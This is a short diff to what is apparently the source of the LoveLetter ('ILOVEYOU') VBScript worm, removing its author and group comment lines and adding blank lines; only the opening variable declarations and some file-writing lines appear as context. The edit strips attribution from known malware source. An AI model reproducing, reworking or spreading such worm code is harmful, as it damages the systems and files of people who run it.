@@ -1,5 +1,4 @@
- rem  barok -loveletter(vbe) <i hate go to school>
- rem by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
+
  On Error Resume Next
  dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
  eq=""
@@ -272,4 +271,5 @@
  d.write vbcrlf
  d.write dt6
  d.close
+
  end sub
